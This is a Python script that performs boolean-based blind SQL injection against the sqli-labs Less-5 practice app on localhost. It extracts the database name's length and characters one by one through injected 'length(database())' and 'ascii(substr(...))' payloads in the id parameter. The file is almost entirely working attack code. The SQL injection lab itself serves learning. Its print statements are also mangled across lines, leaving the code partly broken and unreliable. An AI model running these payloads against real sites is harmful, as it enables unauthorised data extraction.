import requests


# global baseurl = 'http://127.0.0.1/sqli-labs/Less-5/'

def get_databases():
    for i in range(1, 100):
        baseurl = 'http://127.0.0.1/sqli-labs/Less-5/'
        i = str(i)
        url = baseurl + '?id=1\' and (length(database()))=' + i + ' --+'
        # print url
        try:
            response = requests.get(url, timeout=5)
            if 'You are in' in response.content:
                len = int(i);
                break
        except Exception as e:
            print
            e

    print
    "databases lenth is " + str(len)
    urlt = baseurl + "?id=1' and (ascii(substr(database(),{0},1)))={1}--+"
    result = ''
    for i in range(1, len + 1):
        for char in range(0, 127):
            url = urlt.format(i, char)
            print
            url
            try:
                response = requests.get(url, timeout=5)
                if 'You are in' in response.content:
                    result += chr(char)
                    print
                    result + '\n'
                    break
            except Exception as e:
                print(e)

    print
    "databases is " + result


# return result
if __name__ == '__main__':
    get_databases()